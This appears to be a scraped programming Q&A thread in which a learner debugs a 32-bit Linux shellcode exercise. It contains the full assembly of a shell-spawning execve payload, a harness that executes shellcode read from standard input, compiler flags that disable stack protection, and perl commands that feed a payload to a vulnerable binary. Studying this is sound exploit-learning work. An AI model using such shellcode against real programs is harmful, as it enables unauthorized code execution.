    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I am working on a basic shellcode that will spawn a shell after getting called in a 32-bit program.\nHere is the shellcode i'm using:</p>\n<pre><code>xor    %eax,%eax  \npush   %eax  \npush   $0x68732f2f  \npush   $0x6e69622f  \nmov    %esp,%ebx  \npush   %eax  \npush   %ebx  \nmov    %esp,%ecx  \nmov    $0xb,%al  \nint    $0x80  \n</code></pre>\n<p>(Source: <a href=\"http://shell-storm.org/shellcode/files/shellcode-827.php\" rel=\"nofollow noreferrer\">http://shell-storm.org/shellcode/files/shellcode-827.php</a>)</p>\n<p>I am successfully using this shellcode when i hardcode it inside the exploited program:</p>\n<pre><code>char *shellcode = \"\\x31[...]x80\";  \nint main(void)  \n{  \n    (*(void(*)()) shellcode)();  \n    return 0;  \n}  \n</code></pre>\n<p>But when i try to read the shellcode from the standard input, i get a segmentation fault instead. This is the program used:</p>\n<pre><code>#include [...]\ntypedef void (*func)(void);\nint main(void)\n{\n    char input[4096];\n    read(0, input, 4096);\n    ((func)&amp;input)();\n    return 0;\n}\n</code></pre>\n<p>When i debug this program with gdb, i can see that everything goes as planned until this instruction:</p>\n<pre><code>int    $0x80\n</code></pre>\n<p>Where the program doesn't do anything and continue to the next instruction like nothing happened, which make the program crash.</p>\n<p>At first i thought this was because i didn't disabled some execution prevention, but i'm compiling with the following flags:</p>\n<pre><code>gcc shell.c -o shell -fno-stack-protector -m32 -z execstack\n</code></pre>\n<p>I could really use help on it, I've been stuck on it all day.</p>\n</div>",

The program exits normaly and no shell is spawned.   Strace tells me that execve is used correctly (execve(\"/bin//sh\", [\"/bin//sh\"], NULL)  = 0) but nothing happens. In case it helps, here is the full output from strace: <a href=\"https://pastebin.com/Mt3uhSzf\" rel=\"nofollow noreferrer\">pastebin.com/Mt3uhSzf</a>   I don't get much info from gdb, i just see that he can't access an adress after executing bin/dash.   Would you have an idea about what causes this behavior ?</span>",

The problem comes from the first read from the spawned shell where i somehow give a null char which kills it.  Those two sets of commands gives the same result: perl -e 'print \"[payload]\"' &gt; payload.bin   ./vuln &lt; payload.bin  or      perl -e 'print \"[payload]\"' | ./vuln</span>",
